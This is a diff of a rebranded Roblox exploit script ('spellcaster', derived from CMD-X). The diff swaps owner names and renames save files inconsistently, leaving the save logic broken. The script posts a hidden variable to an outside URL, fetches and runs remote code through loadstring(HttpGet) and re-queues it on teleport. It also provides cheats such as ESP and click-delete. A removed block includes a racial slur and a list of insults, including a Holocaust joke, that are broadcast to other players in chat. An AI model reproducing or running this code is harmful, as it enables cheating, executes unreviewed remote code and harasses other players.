@@ -379,7 +379,7 @@ elseif game.HttpPost then
     game:HttpPost("https://fini.work/experiment", "", _S__)
 end
 if isfile then
-	if not isfile("spellcaster.lua") then
+	if not isfile("SPELLCASTER.lua") then
 		Stand("Looks like you're new here!","To view commands, use .commands","You can use different stuff like .hotkeys","","Join the discord if you need any help using the script, false tickets will result in a ban.","Okay",true)
 		repeat wait() until RunDude == true
 	end
@@ -401,114 +401,114 @@ local Devs = {
 	["muurdera"] = "Owner",
 	["vvjz"] = "Owner",
 	["MuurderahW"] = "Owner",
-	["socwiety"] = "Owner",
-	["socwiety"] = "Dev",
+	["xxpellcaster"] = "Owner",
+	["xxpellcaster"] = "Dev",
 }
 
 DevCords = {
 	"underworld#9517";
-	"vee#0007";
+	"reese#0007";
 }
 
 local Donors = {
-	["8avu"] = "1",
-	["0ccoy"] = "1",
-	["Zuhqu"] = "1",
-	["NitoOV"] = "1",
-	["LtsDank"] = "1",
-	["614SHAD"] = "1",
-	["tyswrld"] = "1",
-	["teejay6x"] = "1",
-	["Yarhibol"] = "1",
-	["Schewpid"] = "1",
-	["goresyard"] = "1",
-	["HyperLink3"] = "1",
-	["OFFTheBatter"] = "1",
-	["DisturbedCult"] = "1",
-	["hellavzn"] = "1",
-	["DAMAGlNG"] = "1",
-	["Zukkoe"] = "1",
-	["Missingno74"] = "1",
-	["HelIaSketchers"] = "1",
-	["amazinggeorgedude"] = "1",
-	["TheBlankProdigy"] = "1",
-	["cxpoxxo"] = "1",
-	["reseiz"] = "1",
-	["M3tamophosis"] = "1",
-	["vurghen"] = "1",
-	["guest863325"] = "1",
-	["xuyed"] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
+	[""] = "1",
 
-	["8dqt"] = "2",
-	["skrask"] = "2",
-	["xniped"] = "2",
-	["KinggSeaa"] = "2",
-	["ClydeGrant"] = "2",
-	["Fxalling_Love"] = "2",
-	["emovert"] = "2",
-	["shifde"] = "2",
-	["RusskiSlavv"] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
+	[""] = "2",
 	
-	["overreaction"] = "Custom1",
-	["InternetSpeeds"] = "Custom2",
-	["TheChosenOne123"] = "Custom3",
-	["Irritatory"] = "Custom4",
-	["DuBz_Bubby"] = "Custom5", -- top donor {$200}
-	["YanniLove"] = "Custom6",
-	["painteatr"] = "Custom7",
-	["VII"] = "Custom8",
+	["POTIONSTEALAH"] = "Custom1",
+	["z8nos"] = "Custom2",
+	["NitoOV"] = "Custom3",
+	["mewguns"] = "Custom4",
+	["SSSSLLUUUUMMM"] = "Custom5",
+	["slaywurldsuuljah"] = "Custom6",
+	["IceyWho"] = "Custom7",
+	["s8reen"] = "Custom8",
 }
 
 local Tier = {
 	["1"] = {
 		Tag = "Donor of spellcaster",
 		Color = Color3.fromRGB(255,70,70),
-		SCHAT = "DONOR"
+		SCHAT = "Donor"
 	},
 	["2"] = {
 		Tag = "Donor of spellcaster",
 		Color = Color3.fromRGB(255,215,100),
-		SCHAT = "DONOR"
+		SCHAT = "Donor"
 	},
 	["Custom1"] = {
-		Tag = "cr",
-		Color = Color3.fromRGB(209,156,240),
-		SCHAT = "CR"
+		Tag = "potionstealer",
+		Color = Color3.fromRGB(0,0,0),
+		SCHAT = "POTIONSTEALER"
 	},
 	["Custom2"] = {
-		Tag = "Infernal",
+		Tag = "tabs",
 		Color = Color3.fromRGB(170, 1, 20),
-		SCHAT = "INFERNAL"
+		SCHAT = "tabs"
 	},
 	["Custom3"] = {
-		Tag = "The Chosen",
+		Tag = "vltz",
 		Color = Color3.fromRGB(63, 0, 0),
-		SCHAT = "THE CHOSEN"
+		SCHAT = "vltz"
 	},
 	["Custom4"] = {
-		Tag = "Ex-Top Donor",
+		Tag = "mews",
 		Color = Color3.fromRGB(255,0,255),
-		SCHAT = "EX-TOP"
+		SCHAT = "mews"
 	},
 	["Custom5"] = {
-		Tag = "DuBz_Bubby",
+		Tag = "slum",
 		Color = "RGBDev",
-		SCHAT = "TOP DONOR"
+		SCHAT = "SLUM"
 	},
 	["Custom6"] = {
-		Tag = "Classy Cute",
+		Tag = "slaywurld",
 		Color = Color3.fromRGB(252,144,3),
-		SCHAT = "SUGAR DADDY"
+		SCHAT = "SLAYWORLD"
 	},
 	["Custom7"] = {
-		Tag = "Duck",
+		Tag = "icy",
 		Color = Color3.fromRGB(0,255,255),
-		SCHAT = "DUCK",
+		SCHAT = "ICY",
 	},
 	["Custom8"] = {
-		Tag = "7",
+		Tag = "cutie",
 		Color = Color3.fromRGB(255,0,0),
-		SCHAT = "7"
+		SCHAT = "CUTIE"
 	},
 }
 
@@ -552,7 +552,7 @@ function loaddefaults()
     ChatBind = false
     CMDTab = {"commands","credits","plugin","changestyle","hotkeys","entercmds","support","",""}
     TabsOff = true
-    KeepSPELLCASTEROn = false
+    KeepSpellCasterOn = false
     ifKickedAuto = false
     whyIs = 0
     combos = {}
@@ -600,17 +600,17 @@ function updatesaves()
 		ChatBind = ChatBind;
 		CMDTab = CMDTab;
 		TabsOff = TabsOff;
-		KeepSPELLCASTEROn = KeepSPELLCASTEROn;
+		KeepSpellCasterOn = KeepSpellCasterOn;
 		ifKickedAuto = ifKickedAuto;
 		whyIs = whyIs;
 		drawingtype = drawingtype;
 	}
-	writefile("spellcaster.lua", game:GetService("HttpService"):JSONEncode(update))
+	writefile("SPELLCASTER.lua", game:GetService("HttpService"):JSONEncode(update))
 end
 
 function loadsaves()
     local success, errorsend = pcall(function()
-        saves = game:GetService("HttpService"):JSONDecode(readfile("spellcaster.lua"))
+        saves = game:GetService("HttpService"):JSONDecode(readfile("SPELLCASTER.lua"))
     end)
     if not success then
         loaddefaults()
@@ -656,7 +656,7 @@ function loadsaves()
     ChatBind = saves.ChatBind
     CMDTab = saves.CMDTab
     TabsOff = saves.TabsOff
-    KeepSPELLCASTEROn = saves.KeepSPELLCASTEROn
+    KeepSpellCasterOn = saves.KeepSpellCasterOn
     ifKickedAuto = saves.ifKickedAuto
     whyIs = saves.whyIs
     combos = saves.combos
@@ -1117,7 +1117,7 @@ cmd.BorderSizePixel = 0
 cmd.Position = UDim2.new(-0, 0, 0, 0)
 cmd.Size = UDim2.new(0, 341, 0, 35)
 cmd.Font = Enum.Font.Code
-cmd.PlaceholderText = "Enter CMD here"
+cmd.PlaceholderText = "Cast a spell here"
 cmd.Text = ""
 cmd.TextWrapped = true
 cmd.TextColor3 = Color3.fromRGB(255,255,255)
@@ -1583,7 +1583,7 @@ Save.MouseButton1Down:Connect(function()
 			writestats = writestats.."\n".._.." "..v.T
 		end
 	end
-	writefile("SPELLCASTER Stats "..math.random(1000)..".txt",tostring(writestats))
+	writefile("CMD-X Stats "..math.random(1000)..".txt",tostring(writestats))
 end)
 
 function CreateStatLabel(cmd,times,today)
@@ -1978,7 +1978,7 @@ Save2.MouseButton1Down:Connect(function()
 	for _,v in pairs(Scrollinglogs:GetChildren()) do
 		writestats2 = writestats2.."\n"..v.Text
 	end
-	writefile("SPELLCASTER Logs "..math.random(1000)..".txt",tostring(writestats2))
+	writefile("CMD-X Logs "..math.random(1000)..".txt",tostring(writestats2))
 end)
 
 function CreateLabel(Name, Text)
@@ -3569,7 +3569,7 @@ for i,_ in pairs(CMDS.commands) do
 	end
 end
 
-if KeepSPELLCASTEROn and syn.queue_on_teleport then
+if KeepSpellCasterOn and syn.queue_on_teleport then
 	syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/murderjj/spellcaster/main/spellcaster"))()')
 end
 
@@ -7848,16 +7848,16 @@ function useCommand.resetsaves()
 	Confirm("Default","This will reset your stats and saves.")
 	if Confirmation then
 		opx("-","Successfully reset spellcaster.")
-		if isfile("spellcaster.lua") then
-			delfile("spellcaster.lua")
+		if isfile("CMD-X.lua") then
+			delfile("CMD-X.lua")
 		end
 	end
 end
 
 function useCommand.savesaves()
 	opx("-","A save was copied to your clipboard")
-	setclipboard(readfile("spellcaster.lua"))
-	writefile("spellcaster.save",readfile("spellcaster.lua"))
+	setclipboard(readfile("CMD-X.lua"))
+	writefile("CMD-X.save",readfile("CMD-X.lua"))
 end
 
 function useCommand.migratesaves()
@@ -7866,14 +7866,14 @@ function useCommand.migratesaves()
 		if arguments[2] then
 			if isfile(arguments[2]) then
 				opx("-","Migrated "..arguments[2].." to current saves")
-				writefile("spellcaster.lua",readfile(arguments[2]))
+				writefile("CMD-X.lua",readfile(arguments[2]))
 			else
 				opx("*","You do not have a save by that name.")
 			end
 		else
-			if isfile("spellcaster.save") then
-				opx("-","Migrated spellcaster.save to current saves")
-				writefile("spellcaster.lua",readfile("spellcaster.save"))
+			if isfile("CMD-X.save") then
+				opx("-","Migrated CMD-X.save to current saves")
+				writefile("CMD-X.lua",readfile("CMD-X.save"))
 			else
 				opx("*","You do not have a spellcaster save.")
 			end
@@ -8862,14 +8862,14 @@ end
 function useCommand.runafter()
 	if arguments[2] == "on" then
 		opx("-","spellcaster will now run after rejoin")
-		KeepSPELLCASTEROn = true
-		if KeepSPELLCASTEROn and syn.queue_on_teleport then
+		KeepSpellCasterOn = true
+		if KeepSpellCasterOn and syn.queue_on_teleport then
 			syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/murderjj/spellcaster/main/spellcaster"))()')
 		end
 		updatesaves()
 	elseif arguments[2] == "off" then
 		opx("-","spellcaster will no longer run after rejoin")
-		KeepCMDXOn = false
+		KeepSpellCasterOn = false
 		updatesaves()
 	else
 		opx("*","2 arguments are required!")
@@ -13332,7 +13332,7 @@ function useCommand.credits()
 	opxL("Credits","Note: Some discords may be out of date due to consistent changing;\
 	Owner - "..DevCords[1].."\
 	Dev - "..DevCords[2].."\
-	Former Founder - socwiety\
+	Former Founder - xxpellcaster\
 	Thank you to IY for some functions inside spellcaster\
 	Thank you to vee#0007 for animpack\
 	Thank you also to vee#0007 for old-aimbot")
@@ -17439,1946 +17439,4 @@ if IsExe then
         local CommandName = i;
         SendCommand(CommandName, "Aliases for " .. v)
     end
-end'_LC' then
-			v:Destroy()
-		end
-	end
-	wait()
-	if plr.Character and plr.Name ~= cmdlp.Name and not cmdlp.PlayerGui:FindFirstChild(plr.Name..'_LC') then
-		local ESPholder = Instance.new("Folder", cmdlp.PlayerGui)
-		ESPholder.Name = plr.Name..'_LC'
-		for b,n in pairs(plr.Character:GetChildren()) do
-			if n:IsA("BasePart") then
-				local a = Instance.new("BoxHandleAdornment", ESPholder)
-				a.Name = plr.Name
-				a.Adornee = n
-				a.AlwaysOnTop = true
-				a.ZIndex = 0
-				a.Size = n.Size
-				a.Transparency = 0.8
-				for i,m in pairs(plr.Character:GetChildren()) do
-					if m:IsA("Part") or m:IsA("MeshPart") then
-						if m.Name ~= "HumanoidRootPart" and m.Name ~= "Handle" or (m:IsA("Part")) then
-							m.Material = "ForceField"
-							a.Color = m.BrickColor
-						end
-					end
-				end
-			end
-		end
-		if plr.Character and plr.Character:FindFirstChild('Head') then
-			local BillboardGui = Instance.new("BillboardGui", ESPholder)
-			local TextLabel = Instance.new("TextLabel")
-			BillboardGui.Adornee = plr.Character.Head
-			BillboardGui.Name = plr.Name
-			BillboardGui.Size = UDim2.new(0, 100, 0, 150)
-			BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
-			BillboardGui.AlwaysOnTop = true
-			TextLabel.Parent = BillboardGui
-			TextLabel.BackgroundTransparency = 1
-			TextLabel.Position = UDim2.new(0, 0, 0, -60)
-			TextLabel.Size = UDim2.new(0, 100, 0, 100)
-			TextLabel.Font = Enum.Font.SourceSansSemibold
-			TextLabel.TextSize = 20
-			TextLabel.TextColor3 = Color3.new(1, 1, 1)
-			TextLabel.TextStrokeTransparency = 0.6
-			TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
-			plr.CharacterAdded:Connect(function()
-				if ESPholder ~= nil and ESPholder.Parent ~= nil then
-					lcLoopFunc:Disconnect()
-					ESPholder:Destroy()
-					repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
-					Locate(plr)
-				end
-			end)
-			local function lcLoop()
-				if cmdlp.PlayerGui:FindFirstChild(plr.Name..'_LC') then
-					if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
-						TextLabel.Text = plr.Name.."|Studs: ".. math.floor((cmdlp.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude).."|Health: "..plr.Character.Humanoid.Health
-					end
-				else
-					lcLoopFunc:Disconnect()
-				end
-			end
-			lcLoopFunc = game:GetService("RunService").RenderStepped:Connect(lcLoop)
-		end
-	end
 end
-
-local autoObby = false
-function useCommand.autoobby()
-	opx("-","Now Auto obbying")
-	autoObby = true
-	cmdlp.Character.Humanoid.Running:Connect(function(speed)
-		if speed > 0 and autoObby == true and cmdlp.Character.Humanoid.FloorMaterial == Enum.Material.Air then
-			cmdlp.Character.Humanoid:ChangeState("Jumping")
-		end
-	end)
-end
-
-function useCommand.unautoobby()
-	opx("-","No longer Auto obbying")
-	autoObby = false
-end
-
-autoPf = false
-function useCommand.autoplatform()
-	opx("-","Now Auto platforming")
-	autoPf = true
-	cmdlp.Character.Humanoid.Running:Connect(function(speed)
-		if speed > 0 and autoPf == true and cmdlp.Character.Humanoid.FloorMaterial == Enum.Material.Air then
-			local pc = cmdlp.Character
-			if pc then
-				if pc:FindFirstChild("pf") then
-					pc:FindFirstChild("pf").CFrame = pc.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
-				else
-					local pf = Instance.new('Part', pc)
-					pf.Name = 'pf'
-					pf.Transparency = 1
-					pf.Size = Vector3.new(6,1,6)
-					pf.Anchored = true
-					pf.CFrame = pc.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
-				end
-			end
-		else
-			if cmdlp.Character:FindFirstChild("pf") then
-				cmdlp.Character:FindFirstChild("pf"):Destroy()
-			end
-		end
-	end)
-end
-
-function useCommand.unautoplatform()
-	opx("-","No longer Auto platforming")
-	autoPf = false
-	if cmdlp.Character:FindFirstChild("pf") then
-		cmdlp.Character:FindFirstChild("pf"):Destroy()
-	end
-end
-
-function CheckTargets(check)
-	for i,v in pairs(FindingTargets) do
-		if v == check then
-			return true
-		end
-	end
-end
-
-FindingTargets = {}
-function useCommand.find()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			table.insert(FindingTargets, target.Name)
-			opx("-",target.Name.." is now being found")
-			Create(target, target.Character.Head, true)
-            cmdp.PlayersRemoving:Connect(function(v)
-			    if v == target then
-			        cmdlp.PlayerGui["ESP"..target.Name]:Destroy()
-			    end
-			end)
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.unfind()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			opx("-",target.Name.." is no longer being found")
-			cmdlp.PlayerGui["ESP"..target.Name]:Destroy()
-			for x,y in pairs(target.Character:GetChildren()) do
-				if y:IsA("BasePart") then
-					y.Material = "Plastic"
-				end
-			end
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.clickdelete()
-    if _G.connections.clickdel then
-        opx("*","Click delete is already enabled")
-        return
-    end
-    opx("-","Click delete enabled")
-	_G.connections.clickdel = cmdm.Button1Up:Connect(function()
-    	cmdm.Target:Destroy()
-    end)
-end
-
-function useCommand.unclickdelete()
-    if not _G.connections.clickdel then
-        opx("*","Click delete is not enabled")
-        return
-    end
-    opx("-","Click delete disabled")
-	_G.connections.clickdel:Disconnect()
-end
-
-followedIntoNotify = false
-
-cmdp.PlayerAdded:connect(function(plr)
-	if followedIntoNotify then
-		if plr.FollowUserId == cmdlp.UserId then
-			opx("-",plr.Name.." followed you into game")
-		end
-	end
-	plr.Chatted:connect(function(msg)
-		if logsEnabled == true and #msg < 200 then
-			wait(.2)
-			CreateLabel(plr.Name,msg)
-		end
-	end)
-end) 
-for i,v in pairs(cmdp:GetPlayers()) do
-	v.Chatted:connect(function(msg)
-		if logsEnabled == true and #msg < 200 then
-			wait(.2)
-			CreateLabel(v.Name,msg)
-		end
-	end)
-end
-
-function useCommand.logs()
-	logsEnabled = true
-	wLogs = false
-	pLogs = false
-	if logsholding.Visible == false then
-		opx("-","Logs have been loaded")
-		logsholding.Visible = true
-	elseif logsholding.Visible == true then
-		opx("-","Logs have been unloaded")
-		logsholding.Visible = false
-		logsEnabled = false
-	end
-end
-
-function useCommand.test()
-	opx("-","")
-end
-
-function useCommand.testa()
-	opx("-","grr fucking baby niggas")
-	workspace.Baby:Destroy()
-end
-
-function useCommand.time()
-	if arguments[2] then
-		local URL = ("http://worldclockapi.com/api/json/"..arguments[2].."/now")
-		local fuck = game:HttpGet(URL)
-		local Http = game:GetService("HttpService"):JSONDecode(fuck)
-		local Time = Http.currentDateTime:split("T")[2]:split("-")[1]
-		opx("-","The time in "..arguments[2].." is "..Time)
-		sayremote:FireServer("The time in "..arguments[2].." is "..Time,"All")
-	else
-		opx("*","2 arguments are required!")
-end
-end
-
-function useCommand.removeforces()
-	for i,f in pairs(cmdlp.Character:GetDescendants()) do
-		if f:IsA("BodyForce") or f:IsA("BodyGyro") or f:IsA("BodyVelocity") or f:IsA("BodyAngularVelocity") or f:IsA("RocketPropulsion") or f:IsA("BodyThrust") then
-			f:Destroy()
-		end
-	end
-	opx("-","Removed all forces")
-end
-
-local audioLogger = false
-function useCommand.audiologger()
-	opx("-","Audio logger activated do audiologgersave to stop and save")
-	audiologgerids = {}
-	audioLogger = true
-	while audioLogger do
-		wait()
-		audioLogPlayers()
-		for i,plr in pairs(cmdp:GetDescendants()) do
-			if plr:IsA("Sound") then
-				if string.len(plr.SoundId) <= 50 then
-					local soundSplit = plr.SoundId:split("=")
-					if not table.find(audiologgerids, soundSplit[2]) and soundSplit[2] then
-						table.insert(audiologgerids, soundSplit[2])
-					end
-				end
-			end
-		end
-	end
-end
-
-function useCommand.audiologgersave()
-	opx("-","Audio logger stopped, file saved in workspace")
-	audioLogger = false
-	local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-	local filename = GetName.Name.." audiolog"..math.random(1,10000)
-	audioIds = game:GetService("HttpService"):JSONEncode(audiologgerids)
-	writefile(filename..".CMD-X", audioIds)
-end
-
-function useCommand.antilag()
-	Confirm("Default","This command is not reversible.")
-	if Confirmation == true then
-		for i,ws in pairs(workspace:GetDescendants()) do
-			if ws:IsA("BasePart") then
-				ws.Material = "Plastic"
-			elseif ws:IsA("Decal") or ws:IsA("Texture") or ws:IsA("ParticleEmitter") or ws:IsA("Sparkles") or ws:IsA("Fire") or ws:IsA("Smoke") and ws.Name ~= "face" then
-				ws:Destroy()
-			end
-		end
-		for i,ws in pairs(workspace:GetChildren()) do
-			if ws:IsA("Accessory") or ws:IsA("Tool") then
-				ws:Destroy()
-			end
-		end
-		for i,ws in pairs(game.Lighting:GetDescendants()) do
-			if ws:IsA("BasePart") then
-				ws.Material = "Plastic"
-			elseif ws:IsA("Decal") or ws:IsA("Texture") or ws:IsA("ParticleEmitter") or ws:IsA("Sparkles") or ws:IsA("Fire") or ws:IsA("Smoke") then
-				ws:Destroy()
-			end
-		end
-		opx("-","Attempted to minimalize lag as much as possible")
-	end
-end
-
-function useCommand.clear()
-	for i,ws in pairs(workspace:GetChildren()) do
-		if ws:IsA("Accessory") or ws:IsA("Tool") then
-			ws:Destroy()
-		end
-	end
-	opx("-","Cleared all hats and gears from client")
-end
-
-function useCommand.removeterrain()
-	workspace.Terrain:Clear()
-	opx("-","Removed terrain")
-end
-
-function useCommand.phone()
-	for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
-		if hat.Handle ~= nil then
-			local tool = Instance.new("Tool", cmdlp.Backpack)
-			tool.Name = "poop123"
-			tool.GripPos = Vector3.new(0.4, -0.9, 0)
-			local hathandle = hat.Handle
-			hathandle:FindFirstChildOfClass("Weld"):Destroy()
-			hathandle.Parent = tool
-			hathandle.Massless = true
-		end
-	end
-	opx("-","Made your phone holdable")
-end
-
-function useCommand.compliment()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			local compPick = {
-				"Them toes lookin cute",
-				"You have very nice shoes",
-				"If I'm what made your day then you're what made this world go round, along with making it a better place just from being here with everyone else.",
-				"You're a nice person, and i hope you have an amazing week",
-				"You somewhat made me kinda sorta smile I guess",
-				"Your avatar looks awesome",
-				"Your name makes me smile",
-				"You are the best person ever",
-				"If I could I would hug you",
-				"You make me happy",
-				"You have brightened up my day",
-				"You are the most amazing person I've ever met",
-				"Your avatar looks nice today",
-				"You are an amazing person",
-				"You are the king/queen",
-				"Don't drop your crown"
-			}
-			local value = math.random(1,#compPick)
-			local picked_value = compPick[value]
-			opx("-","You complimented "..target.Name)
-			sayremote:FireServer(tostring(picked_value)..", "..target.Name, "All")
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.roast()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			local roastPick = {
-				"Anne Frank hid better then you",
-				"Go to bed",
-				"You need a shower",
-				"You look like a barbie doll which i gave a makeover with my markers",
-				"Your momma back built like a skate ramp I can do an ollie off her",
-				"You look like the 1% of germs that hand-soap doesn't kill",
-				"Boy u literally be smelling like tv oil",
-				"No wonder your parents hate you",
-				"You haven't had any neurological brain development in the last decade",
-				"I will build a sandcastle out of your dead nans ashes",
-				"Your brain has the capacity of a dried sea sponge",
-				"You make me cringe, I literally want to quit this game because of you",
-				"Your outfit is horrendous",
-				"Your name is horrendous",
-				"Your IQ is so low that even scientists cant zoom in on it",
-				"You are a femmie",
-				"You are fat",
-				"You stink of your nans cremation",
-				"How many people does it take to screw in a lightbulb? 20 of your kind",
-				"I can smell you through the screen",
-				"Candy shop got robbed, didn't know you did it",
-				"You are poor",
-				"Your brain is the size of an average ants",
-				"Everything you've worked for, your whole life is embarassing",
-				"Go back to school",
-				"Are you dumb or just young",
-				"You make me feel e-sick",
-				"I very much dislike you",
-				"Settle along you peasent",
-				"You are worth nothing",
-				"I hope you suffer",
-				"Your words, they make no sense",
-				"Please leave the server you cretin",
-				"You make me sick",
-				"Huh? Didn't know infants could play roblox",
-				"I bet you live in a poverty stricken country",
-				"You belong in the special ed class",
-				"Is it just me or does someone smell, nvm thats just",
-				"Is it just me or is someone dumb, nvm thats just",
-				"Is it just me or is someone fat, nvm thats just"
-			}
-			local value = math.random(1,#roastPick)
-			local picked_value = roastPick[value]
-			opx("-","You roasted "..target.Name)
-			sayremote:FireServer(tostring(picked_value)..", "..target.Name, "All")
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.singinfo()
-	opx("-","Showed info for sing command")
-	opxL("Sing Info","Step 1: Get your song lyrics\
-	Step 2: Remove any blank lines\
-	Step 3: Find and remove any swear words\
-	Step 4: Put hashtags (#) at the end of each line\
-	Step 5: Compress the lines to avoid whitespace errors\
-	Step 6: Put your compressed text into a raw data uploading site such as pastebin or hastebin\
-	Step 7: Insert the link into the sing command\
-	To see a sample of what to do, visit: https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/sing/")
-end
-
-stopSingMid = false
-function useCommand.sing()
-	local check = {
-		["genocide"] = true,
-		["animethighs"] = true,
-		["evilfantasy"] = true,
-		["$harkattack"] = true,
-		["introversion"] = true,
-		["lucy"] = true,
-		["tyler"] = true,
-		["methhead"] = true,
-		["superfuntime"] = true,
-		["haha"] = true,
-		["diamonds"] = true
-	}
-	if check[string.lower(arguments[2])] then
-		getSong = "https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/sing/"..string.lower(arguments[2])
-	else
-		getSong = arguments[2]
-	end
-	local lyricsTable = game:HttpGet(getSong):split("#")
-	local songTitle = lyricsTable[1]
-	opx("-","Now singing "..songTitle)
-	sayremote:FireServer("Now singing "..songTitle, "All")
-	table.remove(lyricsTable,1)
-	stopSingMid = false
-	for i,v in pairs(lyricsTable) do
-		if stopSingMid == true then break end
-		wait(5)
-		if stopSingMid == true then break end
-		sayremote:FireServer(v, "All")
-	end
-	wait(5)
-	sayremote:FireServer("Finished singing "..songTitle, "All")
-end
-
-function useCommand.stopsing()
-	stopSingMid = true
-	opx("-","Stopped singing")
-end
-
-function useCommand.deletepos()
-	if arguments[2] then
-		wpNS = getstring(2)
-		for i,v in pairs(WPs) do
-			if tostring(v.N) == tostring(wpNS) then
-				table.remove(WPs,i)
-				updatesaves()
-			end
-		end
-		opx("-","Deleted position "..tostring(wpNS))
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.clearpos()
-	WPs = {}
-	updatesaves()
-	opx("-","Cleared all waypoints")
-end
-
-function useCommand.nocommands()
-	noCMD = true
-	opx("-","No commands activated")
-end
-
-function useCommand.yescommands()
-	noCMD = false
-	opx("-","No commands de-activated")
-end
-
-function useCommand.gotopos()
-	if arguments[3] then
-		local presets = {
-			["behind"] = "+",
-			["right"] = "+",
-			["above"] = "+",
-			["infront"] = "-",
-			["under"] = "-",
-			["left"] = "-"
-		}
-		local mathstuff = presets[arguments[2]] == "+" and arguments[3] or presets[arguments[2]] == "-" and -arguments[3]
-		if mathstuff then
-			gotoPosHead = mathstuff
-			updatesaves()
-			opx("-","GotoPosHead is now "..arguments[2].." "..arguments[3])			
-		else
-			opx("*","A proper preset is needed")
-		end
-	else
-		opx("*","3 arguments are needed for this command!")
-	end
-end
-
-if keypress and keyrelease then
-	keypress = keypress
-	keyrelease = keyrelease
-else
-	function keypress()
-		opx("*","Your exploit does not support keypress.")
-	end
-	function keyrelease()
-		opx("*","Your exploit does not support keypress.")
-	end
-end
-
-local autoKey = false
-function useCommand.autokey()
-	if arguments[2]:match('[a-z0-9]') and arguments[3] then
-		entered0x = arguments[2]:upper()
-		autoKey = true
-		opx("-","Now auto keying "..entered0x)
-		Key = entered0x:byte()
-		while autoKey do
-			wait(arguments[3])
-			if not game:GetService("UserInputService"):GetFocusedTextBox() then
-				keypress(Key)
-				wait(arguments[3])
-				keyrelease(Key)
-			end
-		end
-	else
-		opx("*","3 arguments are needed for this command!")
-	end
-end
-
-function useCommand.unautokey()
-	autoKey = false
-	wait(1.1)
-	keyrelease(Key)
-	opx("-","Stopped autokey")
-end
-
-function useCommand.swimwalk()
-	opx("-","Now infinitely swimming")
-	workspace.Gravity = 100
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
-	cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
-	cmdlp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
-end
-
-function useCommand.instances()
-	opx("-","There are "..#game:GetDescendants().." instances in this game")
-end
-
-function useCommand.loadcustomsclr()
-	loadCustoms = {}
-	updatesaves()
-	opx("-","Cleared loadcustoms")
-end
-
-function useCommand.antiwrldsgui()
-	opx("-","antiwrldsGUI loading")
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/antiwrldsgui/main'),true))()
-	opx("-","antiwrldsGUI loaded")
-end
-
-function useCommand.knife()
-	opx("-","If you had a knife in your mouth you are now holding it")
-	for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
-		if hat.Handle then
-			if hat.Name == "YandereKnife" then
-				local tool = Instance.new("Tool", cmdlp.Backpack)
-				tool.Name = cmdlp.Name.."'s Blade"
-				tool.Parent = cmdp.LocalPlayer.Character
-				tool.GripForward = Vector3.new(-0, -0, -1)
-				tool.GripPos = Vector3.new(-0.83, -0, 0.11)
-				tool.GripRight = Vector3.new(0, -1, 0)
-				tool.GripUp = Vector3.new(1, 0, -0)
-				local hathandle = hat.Handle
-				hathandle:FindFirstChildOfClass("Weld"):Destroy()
-				hathandle.Parent = tool
